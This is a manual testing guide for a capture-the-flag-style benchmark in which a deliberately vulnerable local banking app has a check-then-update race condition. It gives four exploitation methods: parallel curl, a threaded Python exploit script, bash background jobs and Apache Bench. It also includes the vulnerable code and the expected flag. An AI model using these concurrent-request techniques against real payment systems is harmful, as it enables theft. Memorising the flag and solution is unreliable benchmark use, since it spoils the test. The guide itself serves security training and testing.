# S7BEN-EASY-003: Manual Testing Guide

## Vulnerability: Race Condition - Balance Bypass

### Overview
This benchmark tests for a classic Time-of-Check to Time-of-Use (TOCTOU) race condition in a banking application. The vulnerability allows an attacker to withdraw more money than available by exploiting the gap between balance checking and balance updating.

---

## Setup

### 1. Build and Start the Benchmark
```bash
cd benchmarks/S7BEN-EASY-003
make build
make up
```

### 2. Verify Service is Running
```bash
make test
# Should output: Health check passed
```

### 3. Get the Service Port
```bash
PORT=$(docker compose port app 5000 | cut -d: -f2)
echo "Service running on http://localhost:$PORT"
```

Or simply use port 5000 if using default configuration:
```bash
export URL="http://localhost:5000"
```

---

## Manual Testing Steps

### Step 1: Check Initial Balance
```bash
curl http://localhost:5000/balance
```

**Expected Output:**
```json
{"balance": 100.0}
```

### Step 2: Verify Normal Withdrawal Works
```bash
curl -X POST http://localhost:5000/withdraw \
  -H "Content-Type: application/json" \
  -d '{"amount": 50}'
```

**Expected Output:**
```
Withdrew $50. New Balance: $50
```

### Step 3: Check Balance After Withdrawal
```bash
curl http://localhost:5000/balance
```

**Expected Output:**
```json
{"balance": 50.0}
```

### Step 4: Try to Withdraw More Than Available (Should Fail)
```bash
curl -X POST http://localhost:5000/withdraw \
  -H "Content-Type: application/json" \
  -d '{"amount": 100}'
```

**Expected Output:**
```
Insufficient funds
```

---

## Exploitation

### Method 1: Using GNU Parallel (Recommended)

Install if needed:
```bash
sudo apt-get install parallel
```

Reset the balance first by restarting:
```bash
make down && make up
```

Send 5 simultaneous withdrawal requests:
```bash
seq 5 | parallel -j 5 \
  'curl -X POST http://localhost:5000/withdraw \
   -H "Content-Type: application/json" \
   -d "{\"amount\": 100}"'
```

**Expected Output:**
You should see multiple successful withdrawals, driving the balance negative.

Check the balance:
```bash
curl http://localhost:5000/balance
```

**Expected Output:**
```json
{"balance": -300.0}
```
(or some negative number)

### Method 2: Using Python Script

Create a file `exploit.py`:
```python
import requests
import threading

URL = "http://localhost:5000"

def withdraw(amount):
    """Perform a withdrawal request"""
    try:
        r = requests.post(
            f"{URL}/withdraw",
            json={"amount": amount},
            timeout=5
        )
        print(f"[{threading.current_thread().name}] Response: {r.text}")
    except Exception as e:
        print(f"[{threading.current_thread().name}] Error: {e}")

def exploit_race_condition():
    """Launch multiple simultaneous withdrawal requests"""
    threads = []
    num_requests = 5
    amount = 100

    print(f"[*] Initial balance:")
    r = requests.get(f"{URL}/balance")
    print(f"    {r.json()}")

    print(f"\n[*] Launching {num_requests} simultaneous withdrawals of ${amount}...")

    # Create threads
    for i in range(num_requests):
        t = threading.Thread(target=withdraw, args=(amount,), name=f"Thread-{i+1}")
        threads.append(t)

    # Start all threads at once
    for t in threads:
        t.start()

    # Wait for all threads to complete
    for t in threads:
        t.join()

    print(f"\n[*] Final balance:")
    r = requests.get(f"{URL}/balance")
    balance = r.json()['balance']
    print(f"    {balance}")

    if balance < 0:
        print(f"\n[+] SUCCESS! Balance is negative: ${balance}")
        print(f"[+] Retrieving flag...")
        r = requests.get(f"{URL}/flag")
        print(f"\n{r.text}")
    else:
        print(f"\n[-] Failed. Balance is still positive: ${balance}")
        print(f"[-] Try running the exploit again or increase num_requests")

if __name__ == "__main__":
    exploit_race_condition()
```

Run the exploit:
```bash
python3 exploit.py
```

### Method 3: Using Bash Background Jobs

```bash
# Reset the service
make down && make up

# Launch 5 simultaneous requests in background
for i in {1..5}; do
  curl -X POST http://localhost:5000/withdraw \
    -H "Content-Type: application/json" \
    -d '{"amount": 100}' &
done

# Wait for all background jobs to complete
wait

# Check the balance
curl http://localhost:5000/balance
```

### Method 4: Using curl-loader or Apache Bench

```bash
# Using Apache Bench (ab)
# Create a POST data file
echo '{"amount": 100}' > post_data.json

# Send 10 concurrent requests
ab -n 10 -c 10 -p post_data.json -T application/json \
  http://localhost:5000/withdraw

# Check balance
curl http://localhost:5000/balance
```

---

## Getting the Flag

Once the balance is negative:
```bash
curl http://localhost:5000/flag
```

**Expected Output:**
```
S7BEN{R4C3_C0ND1T10N_M4ST3R}
```

---

## Troubleshooting

### Issue: Balance is exactly 0.0
The app will tell you:
```
Balance is exactly 0. You drained it, but didn't go negative!
Try creating a race condition that processes MULTIPLE requests simultaneously.
```

**Solution:** Increase the number of concurrent requests or try again. The race condition is probabilistic.

### Issue: All requests return "Insufficient funds"
**Cause:** Requests arrived sequentially, not simultaneously.

**Solution:**
- Use more threads/processes
- Restart the service to reset balance
- Try the Python script which has better thread synchronization

### Issue: Service not responding
```bash
# Check if service is running
docker compose ps

# Check logs
docker compose logs app

# Restart if needed
make down && make up
```

---

## Understanding the Vulnerability

### The Vulnerable Code (app.py:89-101)

```python
# 1. Time of Check - Read balance
cur = conn.execute('SELECT balance FROM accounts WHERE id = 1')
row = cur.fetchone()
current_balance = row['balance']

if current_balance >= amount:
    # VULNERABILITY: Artificial delay widens the race window
    time.sleep(random.uniform(0.1, 0.3))

    # 2. Time of Use - Update balance
    # Multiple requests that passed the check will ALL execute this
    conn.execute('UPDATE accounts SET balance = balance - ? WHERE id = 1', (amount,))
```

### Attack Timeline

```
Time  Thread 1          Thread 2          Thread 3
----  --------------    --------------    --------------
t0    Read: $100
t1                      Read: $100
t2                                        Read: $100
t3    Sleep...          Sleep...          Sleep...
t4    Write: $0
t5                      Write: $-100
t6                                        Write: $-200
```

All three threads passed the balance check at t0-t2 (balance was $100).
Then they all subtract $100, resulting in a final balance of $-200.

---

## Cleanup

```bash
make down
make clean
```

---

## Success Criteria

- Initial balance: $100
- After exploitation: Balance < $0
- Flag retrieved successfully from /flag endpoint
